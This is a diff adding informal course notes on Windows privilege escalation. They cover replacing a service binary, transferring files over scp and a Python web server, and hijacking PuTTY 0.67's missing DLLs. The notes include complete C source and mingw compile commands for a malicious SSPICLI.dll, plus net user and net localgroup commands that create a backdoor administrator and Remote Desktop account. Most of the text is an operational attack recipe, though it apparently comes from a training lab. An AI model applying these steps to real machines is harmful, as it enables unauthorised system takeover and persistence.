@@ -1,0 +1,117 @@
+make sure you have view >> hidden items turnedon
+windows privilege escalation
+1)-services
+
+view services via task manager or services
+ this is what i want from my services:
+ -start up type: automatic
+ -log on as: local system
+ -description: <blank description>
+ trusted services, developers will provide a description, run from a trusted directory location, run from a trusted directory location
+
+ -path to executable
+ check the path to the service, and check it's permissions
+ in the gui find the directory, right click and view properties
+ -determine if its writeable, rightclicking inside the directory to see if you can create things
+ IF YOU CAN WRITE To IT:
+--binary replacement
+ 1) look at the path to the executable to determine the file name that we are going to replace
+ 
+ putty.exe <<<< we will need to rename out malicious binary to putty.exe to match what is called upon in the path to executable 
+ 
+ 2) getting out binary on the machine
+ -scp <src file> <dst>
+  scp ./malicious_file student@10.50.31.115:C:/putty
+  
+  rename the legit binary to something else (ie not_putty.exe)
+ -python server
+  on linux box: python3 -m http.server
+  on windows: open firefox and connect to the http://linopsmachine:8000
+  
+  right click and save to the directory with the legit service, rename the malware to the name of the legit exe, rename the legit to something else
+  
+ 3) getting the malicious binary to execute
+ restart the machine
+ may need to do it multiple times!
+IF YOU CAN'T WRITE TO IT 
+--DLL hijacking (if youre struggling to priv ex, prolly need to dll hijack)
+make a new folder on desktop called win-priv, navigate to it
+google putty 0.67
+https://www.chiark.greenend.org.uk/~sgtatham/putty/releases/0.67.html
+in this link: alt binary files > putty.exe
+right click save to the directory we made above, rename it it putty.exe if needed
+
+open command prompt as admin:
+net use * \\live.sysinternals.com\tools >> press enter 
+naviagate to newly made drive Z:
+procmon.exe -accepteula
+filters >>
+process name contains putty include
+Result contains NOT include
+path contains .dll include
+go to google and lookup putty .67 dll vulnerability
+https://www.chiark.greenend.org.uk/~sgtatham/putty/wishlist/vuln-indirect-dll-hijack.html
+https://www.chiark.greenend.org.uk/~sgtatham/putty/wishlist/vuln-indirect-dll-hijack-2.html
+
+find the list of vunerability and compare that to the procmon dll that show up after we run putty
+putty calls for the these dll but they dont exist, so we can craft them
+
+ON LINOPS:
+sudo apt-get install mingw-w64 mingw-w64-common mingw-w64-tools mingw-w64-x86-64-dev -y
+nano SSPICLI.DLL << the name of the dll that it calls for
+
+#include <windows.h>
+int execCommand()
+{
+ WinExec("cmd /C whoami > FINDME_1.txt", 1);  <<< any command can be executed here
+ return 0;
+}
+BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
+{
+ execCommand();
+ return 0;
+}
+###MIGHT NEED TO USE ESCAPE CHAR ON THE "###
+#Compile the raw C source code into a unlinked c object
+i686-w64-mingw32-gcc -c SSPICLI.c -o SSPICLI.o
+
+#Create the DLL from unlinked c object
+i686-w64-mingw32-gcc -shared -o SSPICLI.dll SSPICLI.o -Wl,--out-implib,SSPICLI.a
+
+copy the .dll over to the same directory that contains the exe on the windows device, using the python3 web server is the easiest method of transportation
+
+restart machine
+
+
+commands to escalate our privs:::
+-add a new user, add them to admin group
+and remote desktop group
+-add exisiting user to admin group and remote desktop group
+    net user << list of users
+    net user NewUserBobby password /add << makes a new user
+    net localgroup Administrators NewUserBobby /add << adds new user to admin group
+    net localgroup Administrators << check list of admin users
+    net localgroup "Remote Desktop Users" NewUserBobby /add << add newuser to Remote Desktop group 
+    
+    YOULL NEED TO BE IN AN ADMIN CMD PROMPT OR JUST USE TO GUI
+  2)-schedule tasks
+  
+task scheduler
+general tab > security > SYSTEM
+Triggers Tab > Trigger/Details: Desireable (At logon, at startup, at log on of any user, SOMETHING THAT HAPPENS OFTEN)
+action tab > action: start a program, detail: <writable directories>
+--binary replacement
+same as above   
+--DLL hijacking
+same as above
+
+3)-event log
+--requires elevated privileges to look at certain logs (security)
+check event viewer >> windows logs >> security
+filter current log << search for specific things
+save filtered log file as
+
+4)-auditpol (security policies) 
+--requires elevated privileges
+auditpol /get /category:* << needs privs to view
+DONT FUCKING CHECK THE LOCAL SECURITY POLICY, IT'S NOT THE SAME THING
